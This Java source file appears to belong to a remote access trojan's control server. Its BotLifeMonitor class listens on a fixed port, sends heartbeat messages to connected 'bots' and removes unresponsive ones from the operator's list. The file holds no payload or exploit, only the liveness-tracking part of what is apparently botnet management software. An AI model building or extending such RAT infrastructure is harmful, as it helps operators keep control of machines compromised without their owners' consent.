package rat_server;

import java.io.IOException;
import java.io.ObjectOutputStream;
import java.net.ConnectException;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.util.ArrayList;
import javax.swing.DefaultListModel;

public class BotLifeMonitor
{
    private ServerSocket lifeMonitor;
    private final DefaultListModel<String> dlm;
    private ArrayList<BotManager> bots;
    private int down_times=0;
    
    public BotLifeMonitor(DefaultListModel<String> dlm,ArrayList<BotManager> bots)
    {
        this.dlm=dlm;
        this.bots=bots;
        try
        {
            lifeMonitor=new ServerSocket(54326);
        }
        catch(IOException exc)
        {
            exc.printStackTrace();
        }
        new Thread(new Runnable() {

            @Override
            public void run() {
                while(true)
                    try
                    {
                        new BotMonitor(lifeMonitor.accept());
                    }
                    catch(IOException exc)
                    {
                          
                    }
          }
        }).start();
        
    }
    
    private class BotMonitor
    {
        private Socket socket;
        private String botName;
        public BotMonitor(Socket socket) throws IOException
        {
            this.socket=socket;
            botName=socket.getInetAddress().getHostAddress();
            ObjectOutputStream oos=new ObjectOutputStream(socket.getOutputStream());
            while(true)
                try
                {
                    if(!CommunicationStatus.inComingConnection)
                    {
                        oos.writeUTF("ACK");
                        oos.flush();
                        Thread.sleep(100);
                    }
                    down_times=0;
                }
                catch(SocketException exc)
                {
                    if(!CommunicationStatus.inComingConnection)   
                        down_times++;
                    if(down_times>=5&&!CommunicationStatus.inComingConnection)
                    {
                        try
                        {
                            oos.writeUTF("ACK");
                            Thread.sleep(100);
                        }
                        catch(SocketException _exc)
                        {
                            System.out.println("Bot disconnected!");
                            dlm.removeElement(botName); //remove from view
                            for(int i=0;i<bots.size();i++)
                                if(bots.get(i).getSocket().getInetAddress().getHostAddress().equals(botName))
                                {
                                    bots.remove(i); //remove from list
                                    break;
                                }
                            break;
                        }
                        catch(InterruptedException _exc)
                        {
                    
                        }
                    }
                }
                catch(InterruptedException exc)
                {
                    
                }
        }
    }
}
